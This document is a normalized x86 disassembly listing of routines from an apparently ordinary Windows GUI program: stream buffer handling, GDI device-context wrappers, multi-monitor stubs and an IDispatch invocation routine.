mov [ esi + 0x28 ] eax
add eax ecx
mov [ ebx ] eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
jb r-xdata
push [ ebp + 0x8 ]
mov ecx [ esi + 0x24 ]
mov eax [ ecx ]
push edi
call [ eax + 0x34 ]
add [ ebp - 0x4 ] eax
sub [ ebp + 0x8 ] eax
add edi eax
test eax eax
jbe r-xdata
sub_408f89
push esi
mov esi ecx
mov eax [ esi + 0x18 ]
not eax
test al 0x1
jne r-xdata
mov eax [ esi + 0x28 ]
inc eax
inc eax
cmp eax [ esi + 0x2c ]
jbe r-xdata
push [ esi + 0x14 ]
push 0x2
call sub_4092e9
mov eax [ esi + 0x28 ]
mov cx [ esp + 0x8 ]
mov [ eax ] cx
add [ esi + 0x28 ] 0x2
mov eax esi
pop esi
retn 0x4
call sub_408e25
sub_408fc3
push esi
mov esi ecx
mov eax [ esi + 0x18 ]
not eax
test al 0x1
jne r-xdata
mov eax [ esi + 0x28 ]
add eax 0x4
cmp eax [ esi + 0x2c ]
jbe r-xdata
push [ esi + 0x14 ]
push 0x2
call sub_4092e9
mov eax [ esi + 0x28 ]
mov ecx [ esp + 0x8 ]
mov [ eax ] ecx
add [ esi + 0x28 ] 0x4
mov eax esi
pop esi
retn 0x4
call sub_408e25
sub_408ffc
push esi
mov esi ecx
test [ esi + 0x18 ] 0x1
jne r-xdata
mov eax [ esi + 0x28 ]
mov ecx [ esi + 0x2c ]
lea edx [ eax + 0x2 ]
cmp edx ecx
jbe r-xdata
push [ esi + 0x14 ]
push 0x4
call sub_4092e9
mov eax [ esi + 0x28 ]
mov ax [ eax ]
mov ecx [ esp + 0x8 ]
mov [ ecx ] ax
add [ esi + 0x28 ] 0x2
mov eax esi
pop esi
retn 0x4
sub eax ecx
inc eax
inc eax
push eax
mov ecx esi
call sub_408e9c
sub_40903f
push esi
mov esi ecx
test [ esi + 0x18 ] 0x1
jne r-xdata
mov eax [ esi + 0x28 ]
mov ecx [ esi + 0x2c ]
lea edx [ eax + 0x4 ]
cmp edx ecx
jbe r-xdata
push [ esi + 0x14 ]
push 0x4
call sub_4092e9
mov eax [ esi + 0x28 ]
mov eax [ eax ]
mov ecx [ esp + 0x8 ]
mov [ ecx ] eax
add [ esi + 0x28 ] 0x4
mov eax esi
pop esi
retn 0x4
sub eax ecx
add eax 0x4
push eax
mov ecx esi
call sub_408e9c
sub_409081
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
test ebx ebx
push esi
mov esi ecx
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x18 ]
not eax
test al 0x1
jne r-xdata
mov ecx [ esi + 0x28 ]
mov eax [ esi + 0x2c ]
sub eax ecx
cmp ebx eax
push edi
mov edi ebx
jb r-xdata
push [ esi + 0x14 ]
push 0x2
call sub_4092e9
push edi
push [ ebp + 0x8 ]
push eax
push ecx
call sub_406d68
add [ esi + 0x28 ] edi
add [ ebp + 0x8 ] edi
add esp 0x10
sub ebx edi
je r-xdata
mov edi eax
pop edi
mov ecx esi
call sub_408e25
xor edx edx
mov eax ebx
div [ esi + 0x20 ]
mov ecx [ esi + 0x24 ]
mov eax [ ecx ]
mov edi ebx
sub edi edx
push edi
push [ ebp + 0x8 ]
call [ eax + 0x38 ]
add [ ebp + 0x8 ] edi
sub ebx edi
cmp [ esi + 0x8 ] 0x0
je r-xdata
cmp ebx [ esi + 0x20 ]
jb r-xdata
mov ecx [ esi + 0x24 ]
mov edx [ ecx ]
lea eax [ esi + 0x2c ]
push eax
lea edi [ esi + 0x30 ]
push edi
push [ esi + 0x20 ]
push 0x1
call [ edx + 0x50 ]
mov eax [ edi ]
mov [ esi + 0x28 ] eax
mov eax [ esi + 0x28 ]
cmp eax [ esi + 0x30 ]
jne r-xdata
call sub_4054e9
push ebx
push [ ebp + 0x8 ]
push ebx
push eax
call sub_406d68
add esp 0x10
add [ esi + 0x28 ] ebx
sub_409146
push esi
push edi
mov edi [ esp + 0xc ]
mov eax 0xffff
cmp edi eax
mov esi ecx
jae r-xdata
push eax
call sub_408f89
push edi
mov ecx esi
call sub_408fc3
push edi
call sub_408f89
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_409172
push ebp
mov ebp esp
push ecx
push esi
lea eax [ ebp - 0x4 ]
push eax
mov esi ecx
call sub_408ffc
cmp [ ebp - 0x4 ] 0xffff
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov ecx esi
call sub_40903f
mov eax [ ebp - 0x4 ]
movzx eax [ ebp - 0x4 ]
jmp r-xdata
pop esi
leave
retn
sub_4091c6
push 0xc
mov eax sub_420ed0
call sub_410250
mov esi ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_4082df
push eax
lea ecx [ ebp - 0x14 ]
call sub_405b13
lea eax [ esi + 0xc ]
push eax
lea ecx [ ebp + 0x10 ]
mov [ ebp - 0x4 ] 0x1
call sub_406a32
mov edi [ ebp + 0x10 ]
cmp [ edi - 0xc ] 0x0
mov [ ebp - 0x4 ] 0x2
jne r-xdata
mov ecx [ esi + 0x8 ]
add ecx 0xf1b0
mov [ eax ] ecx
mov eax [ esi + 0x8 ]
push edi
add eax 0xf1b0
push eax
lea eax [ ebp - 0x14 ]
push eax
call sub_408cb4
push 0xffffffff
push [ ebp - 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_405532
add esp 0x10
lea ecx [ edi - 0x10 ]
call sub_4056ce
mov ecx [ ebp - 0x14 ]
add ecx 0xfffffff0
call sub_4056ce
xor eax eax
inc eax
jmp r-xdata
push 0xf006
lea ecx [ ebp + 0x10 ]
call sub_405ea0
mov edi [ ebp + 0x10 ]
call sub_4102bc
retn 0xc
sub_40927d
push 0x4
mov eax sub_420ef6
call sub_41021d
mov esi ecx
mov [ ebp - 0x10 ] esi
call sub_40555e
lea edi [ esi + 0xc ]
mov ecx edi
mov [ esi ] r--data
call sub_405c49
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
mov ecx edi
mov [ esi + 0x8 ] eax
call sub_405ee0
mov eax esi
call sub_4102bc
retn 0x8
sub_4092c1
push esi
mov esi ecx
mov ecx [ esi + 0xc ]
sub ecx 0x10
mov [ esi ] r--data
call sub_4056ce
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_40f613
pop ecx
sub_4092e9
push 0x8
mov eax sub_420ea5
call sub_41021d
push 0x10
call sub_4053df
pop ecx
mov ecx eax
mov [ ebp - 0x14 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x10 ] eax
push r--data
lea eax [ ebp - 0x10 ]
push eax
call sub_40fe0c
int3
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40927d
sub_40934a
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
xor ebx ebx
test eax eax
push edi
mov edi [ SaveDC@IAT ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
push eax
call edi
mov ebx eax
pop edi
pop esi
mov eax ebx
pop ebx
retn
push eax
call edi
test eax eax
je r-xdata
or ebx 0xffffffff
sub_40937b
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
xor eax eax
inc eax
cmp ecx [ esi + 0x8 ]
push edi
mov edi [ RestoreDC@IAT ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ esp + 0xc ]
push ecx
call edi
pop edi
pop esi
retn 0x4
test eax eax
je r-xdata
xor eax eax
push [ esp + 0xc ]
push esi
call edi
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
sub_4093b9
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
or eax 0xffffffff
cmp ecx [ esi + 0x8 ]
push edi
mov edi [ SetBkColor@IAT ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ esp + 0xc ]
push ecx
call edi
pop edi
pop esi
retn 0x4
push [ esp + 0xc ]
push esi
call edi
sub_4093e8
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
or eax 0xffffffff
cmp ecx [ esi + 0x8 ]
push edi
mov edi [ SetTextColor@IAT ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ esp + 0xc ]
push ecx
call edi
pop edi
pop esi
retn 0x4
push [ esp + 0xc ]
push esi
call edi
sub_409417
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
xor eax eax
cmp ecx [ esi + 0x8 ]
push edi
mov edi [ SetMapMode@IAT ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ esp + 0xc ]
push ecx
call edi
pop edi
pop esi
retn 0x4
push [ esp + 0xc ]
push esi
call edi
sub_4094ce
push ebp
mov ebp esp
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ecx + 0x4 ]
call [ ExtTextOutA@IAT ]
pop ebp
retn 0x1c
sub_4094f3
push ebp
mov ebp esp
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ecx + 0x4 ]
call [ TabbedTextOutA@IAT ]
mov ecx [ ebp + 0x8 ]
movsx edx ax
shr eax 0x10
movsx eax ax
mov [ ecx + 0x4 ] eax
mov [ ecx ] edx
mov eax ecx
pop ebp
retn 0x20
sub_409566
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
push [ ecx + 0x4 ]
call [ GrayStringA@IAT ]
pop ebp
retn 0x20
mov eax [ eax + 0x4 ]
sub_4095b2
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
push edi
mov edi [ SetViewportOrgEx@IAT ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebp
retn 0xc
push [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_4095ef
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
push edi
mov edi [ OffsetViewportOrgEx@IAT ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebp
retn 0xc
push [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_40962c
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
push edi
mov edi [ SetViewportExtEx@IAT ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebp
retn 0xc
push [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_409669
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
push edi
mov edi [ ScaleViewportExtEx@IAT ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebp
retn 0x14
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_4096b2
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
push edi
mov edi [ SetWindowExtEx@IAT ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebp
retn 0xc
push [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_4096ef
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
push edi
mov edi [ ScaleWindowExtEx@IAT ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebp
retn 0x14
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_409738
push 0x10
call sub_4053df
pop ecx
xor ecx ecx
cmp eax ecx
je r-xdata
xor eax eax
retn
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
retn
sub_4097de
push 0x0
mov eax sub_42117d
call sub_41021d
call sub_407ede
mov esi eax
cmp [ esi + 0x1c ] 0x0
jne r-xdata
mov eax [ esi + 0x1c ]
call sub_4102bc
retn 0x4
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push sub_40e653
call sub_4053cd
push 0x60
mov ebx eax
call sub_4053df
pop ecx
mov ecx eax
mov [ ebp + 0x8 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
push 0x2
push 0x4
push sub_40f245
push sub_409773
push r--data
call sub_40ed0c
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov [ esi + 0x1c ] eax
call sub_4053cd
sub_409860
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x14 ]
and [ esi + 0x4 ] 0x0
mov eax edi
pop edi
pop esi
retn
push 0x0
call sub_4097de
test eax eax
je r-xdata
push [ esi + 0x4 ]
lea ecx [ eax + 0x1c ]
call sub_4088e6
sub_4098aa
push 0x0
mov eax sub_42117d
call sub_41021d
call sub_407ede
mov esi eax
cmp [ esi + 0x20 ] 0x0
jne r-xdata
mov eax [ esi + 0x20 ]
call sub_4102bc
retn 0x4
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push sub_40e653
call sub_4053cd
push 0x60
mov ebx eax
call sub_4053df
pop ecx
mov ecx eax
mov [ ebp + 0x8 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
push 0x1
push 0x4
push sub_40f245
push sub_40978f
push r--data
call sub_40ed0c
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov [ esi + 0x20 ] eax
call sub_4053cd
sub_40992c
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
and [ esi + 0x4 ] 0x0
mov eax edi
pop edi
pop esi
retn
push 0x0
call sub_4098aa
test eax eax
je r-xdata
push [ esi + 0x4 ]
lea ecx [ eax + 0x1c ]
call sub_4088e6
sub_409988
push ebx
push esi
push edi
push [ esp + 0x10 ]
mov esi ecx
call [ GetStockObject@IAT ]
mov ecx [ esi + 0x4 ]
mov edi [ SelectObject@IAT ]
mov ebx eax
xor eax eax
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push ebx
push ecx
call edi
push eax
call sub_40991e
pop edi
pop esi
pop ebx
retn 0x4
push ebx
push esi
call edi
sub_4099c4
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
xor eax eax
cmp ecx [ esi + 0x8 ]
push edi
mov edi [ SelectObject@IAT ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
push eax
call sub_40991e
pop edi
pop esi
pop ebx
retn 0x4
test ebx ebx
jne r-xdata
push eax
push ecx
call edi
mov eax [ ebx + 0x4 ]
mov eax [ ebx + 0x4 ]
xor eax eax
jmp r-xdata
push eax
push esi
call edi
sub_409a2c
push ebp
mov ebp esp
sub esp 0x98
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x90
lea eax [ ebp - 0x94 ]
push 0x0
push eax
call sub_4109d0
add esp 0xc
lea eax [ ebp - 0x98 ]
push eax
mov [ ebp - 0x98 ] 0x94
call [ GetVersionExA@IAT ]
mov ecx [ ebp - 0x4 ]
xor eax eax
cmp [ ebp - 0x88 ] 0x2
sete al
xor ecx ebp
call sub_40f589
leave
retn
sub_409a84
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
je r-xdata
push esi
push edi
call sub_409a2c
push r--data
mov [ rw-data ] eax
call [ GetModuleHandleA@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
xor eax eax
cmp [ rw-data ] ebx
pop ebx
setne al
retn
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
xor eax eax
jmp r-xdata
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
pop edi
pop esi
mov [ rw-data ] 0x1
pop ebx
retn
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
xor eax eax
inc eax
sub_409b79
call sub_409a84
test eax eax
je r-xdata
test [ esp + 0x8 ] 0x3
push esi
push edi
jne r-xdata
jmp [ rw-data ]
mov eax 0x12340042
mov esi [ esp + 0xc ]
xor eax eax
cmp [ esi + 0x8 ] eax
jle r-xdata
xor eax eax
jmp r-xdata
cmp [ esi + 0xc ] eax
jle r-xdata
pop edi
pop esi
retn 0x8
mov edi [ GetSystemMetrics@IAT ]
push eax
call edi
cmp [ esi ] eax
jge r-xdata
push 0x1
call edi
cmp [ esi + 0x4 ] eax
jl r-xdata
sub_409bc5
push ebp
mov ebp esp
sub esp 0x2c
call sub_409a84
test eax eax
je r-xdata
test [ ebp + 0xc ] 0x3
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
jmp r-xdata
push [ ebp + 0x8 ]
call [ IsIconic@IAT ]
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
leave
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
call [ GetWindowRect@IAT ]
lea eax [ ebp - 0x2c ]
push eax
push [ ebp + 0x8 ]
call [ GetWindowPlacement@IAT ]
jmp r-xdata
xor eax eax
push [ ebp + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call sub_409b79
jmp r-xdata
test eax eax
je r-xdata
sub_409c30
push ebp
mov ebp esp
sub esp 0x10
call sub_409a84
test eax eax
je r-xdata
cmp [ ebp + 0x8 ] 0x12340042
push ebx
push esi
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
jmp r-xdata
xor eax eax
mov ebx [ ebp + 0xc ]
xor esi esi
cmp ebx esi
je r-xdata
leave
retn 0x8
cmp [ ebx ] 0x28
jb r-xdata
push esi
lea eax [ ebp - 0x10 ]
push eax
push esi
push 0x30
call [ SystemParametersInfoA@IAT ]
test eax eax
je r-xdata
push edi
mov [ ebx + 0x4 ] esi
mov [ ebx + 0x8 ] esi
push esi
mov esi [ GetSystemMetrics@IAT ]
call esi
push 0x1
mov [ ebx + 0xc ] eax
call esi
lea edi [ ebx + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor esi esi
inc esi
cmp [ ebx ] 0x48
mov [ ebx + 0x10 ] eax
mov [ ebx + 0x24 ] esi
pop edi
jb r-xdata
mov eax esi
jmp r-xdata
push 0x1f
push r--data
push 0x20
add ebx 0x28
push ebx
call sub_412d19
add esp 0x10
pop esi
pop ebx
sub_409cc9
push ebp
mov ebp esp
sub esp 0x44
push ebx
mov ebx [ ebp + 0x8 ]
xor edx edx
cmp ebx edx
push esi
push edi
mov [ ebp - 0x20 ] dx
jne r-xdata
mov edi [ ebp + 0x1c ]
cmp edi edx
jne r-xdata
mov eax 0x80070057
jmp r-xdata
mov ecx [ edi + 0x8 ]
cmp ecx 0x5
jbe r-xdata
mov eax 0x80020008
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x24
cmp [ edi + 0xc ] edx
mov [ ebp + 0x8 ] edx
jbe r-xdata
mov eax 0x8002000e
jmp r-xdata
cmp [ ebp + 0x8 ] ecx
jae r-xdata
mov eax [ edi + 0x4 ]
mov [ ebp + 0x1c ] eax
cmp [ ebp + 0x28 ] 0x0
mov esi 0x80020003
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx ecx
sub edx [ ebp + 0x8 ]
shl eax 0x4
add eax [ edi ]
sub ecx [ ebp + 0x8 ]
lea edx [ ebp + edx * 4 - 0x48 ]
mov esi [ edi ]
add [ ebp + 0x1c ] 0x4
add esi edx
inc [ ebp + 0x8 ]
mov [ ebp + eax * 4 - 0x44 ] esi
mov eax [ ebp + 0x8 ]
add edx 0x10
cmp eax [ edi + 0xc ]
jb r-xdata
cmp [ ebp + 0x20 ] 0x0
jne r-xdata
lea eax [ ebp + 0x18 ]
mov [ ebp + 0x28 ] eax
mov [ edx ] eax
add eax 0x10
sub edx 0x4
dec ecx
jne r-xdata
mov eax [ ebp + 0x1c ]
mov eax [ eax ]
cmp eax ecx
jae r-xdata
lea eax [ ebp - 0x10 ]
push eax
call [ VariantInit@IAT ]
mov eax [ ebp + 0xc ]
add eax 0x139a
cmp eax 0x12
ja r-xdata
lea eax [ ebp - 0x20 ]
mov [ ebp + 0x20 ] eax
lea eax [ ebp - 0x10 ]
push eax
call [ VariantClear@IAT ]
mov eax esi
mov cl [ ebp + 0x18 ]
push 0x2
pop edx
jmp [ eax * 4 + jump_table_40a249 ]
cmp [ edi + 0x8 ] 0x1
jne r-xdata
cmp [ edi + 0x8 ] 0x2
jne r-xdata
cmp [ edi + 0x8 ] 0x2
jne r-xdata
cmp [ edi + 0x8 ] 0x5
jne r-xdata
cmp [ edi + 0x8 ] 0x2
jne r-xdata
cmp [ edi + 0x8 ] 0x1
jne r-xdata
push [ ebp + 0x20 ]
mov eax [ ebx ]
push ebx
call [ eax + 0x4c ]
jmp r-xdata
push [ ebp + 0x20 ]
mov eax [ ebx ]
push ebx
call [ eax + 0x48 ]
jmp r-xdata
cmp [ edi + 0x8 ] 0x1
jne r-xdata
cmp [ edi + 0x8 ] 0x2
jne r-xdata
cmp [ edi + 0x8 ] 0x1
jne r-xdata
cmp [ edi + 0x8 ] 0x1
jne r-xdata
cmp [ edi + 0x8 ] 0x1
jne r-xdata
cmp [ edi + 0x8 ] 0x1
jne r-xdata
test dl cl
je r-xdata
test dl cl
je r-xdata
cmp [ edi + 0x8 ] 0x1
je r-xdata
mov ecx [ ebp + 0x20 ]
mov eax [ ebx ]
add ecx 0x8
push ecx
push ebx
call [ eax + 0x20 ]
mov ecx [ ebp + 0x20 ]
mov eax [ ebx ]
add ecx 0x8
push ecx
push ebx
call [ eax + 0x1c ]
mov esi 0x8002000e
jmp r-xdata
mov esi [ ebp - 0x44 ]
mov eax [ ebx ]
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push ebx
movsd [ edi ] [ esi ]
call [ eax + 0x64 ]
jmp r-xdata
mov eax [ ebp - 0x44 ]
cmp [ eax ] 0x3
mov edi [ VariantChangeType@IAT ]
je r-xdata
mov eax [ ebp - 0x44 ]
cmp [ eax ] 0x3
je r-xdata
mov esi [ ebp - 0x44 ]
mov eax [ ebp - 0x10 ]
mov eax [ ebp - 0x44 ]
cmp [ eax ] 0x3
je r-xdata
mov ecx [ ebp + 0x20 ]
mov esi [ ebp - 0x44 ]
mov eax [ ebx ]
add ecx 0x8
push ecx
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push ebx
movsd [ edi ] [ esi ]
call [ eax + 0x50 ]
jmp r-xdata
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x20 ]
mov esi [ ebp - 0x44 ]
mov eax [ ebx ]
add ecx 0x8
push ecx
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push ebx
movsd [ edi ] [ esi ]
call [ eax + 0x44 ]
jmp r-xdata
mov esi [ ebp - 0x44 ]
movzx eax [ esi ]
test ax 0x4000
je r-xdata
mov ecx [ ebp + 0x20 ]
mov esi [ ebp - 0x44 ]
mov eax [ ebx ]
add ecx 0x8
push ecx
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push ebx
movsd [ edi ] [ esi ]
call [ eax + 0x3c ]
jmp r-xdata
push [ ebp + 0x20 ]
mov esi [ ebp - 0x44 ]
mov eax [ ebx ]
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push ebx
movsd [ edi ] [ esi ]
call [ eax + 0x38 ]
jmp r-xdata
push [ ebp + 0x20 ]
mov esi [ ebp - 0x44 ]
mov eax [ ebx ]
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push ebx
movsd [ edi ] [ esi ]
call [ eax + 0x34 ]
jmp r-xdata
mov ecx [ ebp + 0x20 ]
mov esi [ ebp - 0x44 ]
mov eax [ ebx ]
add ecx 0x8
push ecx
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push ebx
movsd [ edi ] [ esi ]
call [ eax + 0x30 ]
jmp r-xdata
test cl 0x4
je r-xdata
cmp [ edi + 0x8 ] 0x1
jne r-xdata
test cl 0x4
je r-xdata
cmp [ edi + 0x8 ] 0x1
jne r-xdata
mov ecx [ ebp + 0x20 ]
mov esi [ ebp - 0x44 ]
mov eax [ ebx ]
add ecx 0x8
push ecx
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push ebx
movsd [ edi ] [ esi ]
call [ eax + 0x24 ]
jmp r-xdata
mov eax [ ebp + 0x20 ]
mov [ eax ] 0x3
jmp r-xdata
mov eax [ ebp + 0x20 ]
mov [ eax ] 0x9
mov eax [ eax + 0x8 ]
mov [ ebp + 0x18 ] eax
mov eax [ ebp - 0x40 ]
cmp [ eax ] 0x3
je r-xdata
push 0x3
push 0x0
push eax
lea eax [ ebp - 0x10 ]
push eax
call edi
mov esi eax
test esi esi
jl r-xdata
push [ ebp + 0x20 ]
mov esi [ ebp - 0x40 ]
mov eax [ eax + 0x8 ]
mov ecx [ ebx ]
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
push ebx
movsd [ edi ] [ esi ]
call [ ecx + 0x5c ]
jmp r-xdata
push 0x3
push 0x0
push eax
lea eax [ ebp - 0x10 ]
push eax
call [ VariantChangeType@IAT ]
mov esi eax
test esi esi
jl r-xdata
mov ecx [ ebp + 0x28 ]
and [ ecx ] 0x0
mov esi [ ebp - 0x34 ]
mov ecx [ ebx ]
sub esp 0x10
mov edi esp
push [ ebp - 0x4 ]
movsd [ edi ] [ esi ]
push [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
push [ ebp - 0xc ]
movsd [ edi ] [ esi ]
push eax
push ebx
movsd [ edi ] [ esi ]
call [ ecx + 0x58 ]
jmp r-xdata
test cl 0xf
je r-xdata
mov esi [ ebp - 0x40 ]
mov eax [ eax + 0x8 ]
mov ecx [ ebx ]
sub esp 0x10
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
